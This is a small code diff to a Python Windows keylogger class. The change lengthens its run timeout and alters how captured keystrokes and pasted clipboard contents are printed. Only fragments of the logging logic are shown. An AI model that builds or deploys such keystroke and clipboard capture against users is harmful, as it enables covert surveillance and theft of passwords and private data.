@@ -8,7 +8,7 @@ import time
 import win32clipboard
 
 
-TIMEOUT = 60 * 3
+TIMEOUT = 60 * 60
 
 class KeyLogger:
     def __init__(self):
@@ -51,7 +51,7 @@ class KeyLogger:
             self.get_current_process()
 
         if 32 < event.Ascii < 127:
-            print(chr(event.Ascii), end='')
+            print(chr(event.Ascii), end=' ')
         else:
             if event.Key == 'V':
                 win32clipboard.OpenClipboard()
@@ -59,7 +59,7 @@ class KeyLogger:
                 win32clipboard.CloseClipboard()
                 print(f'[PASTE] - {value}')
             else:
-                print(f'{event.Key}', end='')
+                print(f'{event.Key}', end=' ')
         return True
 
 def run():
